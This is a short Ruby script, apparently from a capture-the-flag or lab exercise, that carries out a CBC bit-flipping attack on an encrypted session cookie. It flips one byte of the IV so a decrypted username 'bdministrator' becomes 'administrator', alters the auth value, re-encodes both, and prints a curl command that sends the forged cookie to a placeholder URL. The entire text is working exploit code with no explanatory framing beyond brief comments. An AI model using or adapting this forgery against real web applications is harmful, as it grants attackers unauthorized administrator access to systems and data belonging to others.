require 'cgi'
require 'base64'

#---------------------------------------------------------------#
# Example of [iv]: "Fyar...%3D"                                 #
#---------------------------------------------------------------#

iv = [iv]
auth = [auth]

decoded_iv = Base64.decode64(CGI.unescape(iv))
decoded_auth = Base64.decode64(CGI.unescape(auth))

#---------------------------------------------------------------#
# bdministrator -> administrator                                #
# malicious_iv[0] = 'a'^'b'^decoded_iv[0]                       #
# malicious_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr     #
#---------------------------------------------------------------#

decoded_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr
decoded_auth[0] = 'a'

new_iv = CGI.escape(Base64.strict_encode64(decoded_iv))
new_auth = CGI.escape(Base64.strict_encode64(decoded_auth))

puts "curl -H 'Cookie: iv=#{new_iv}; auth=#{new_auth}' [URL]"
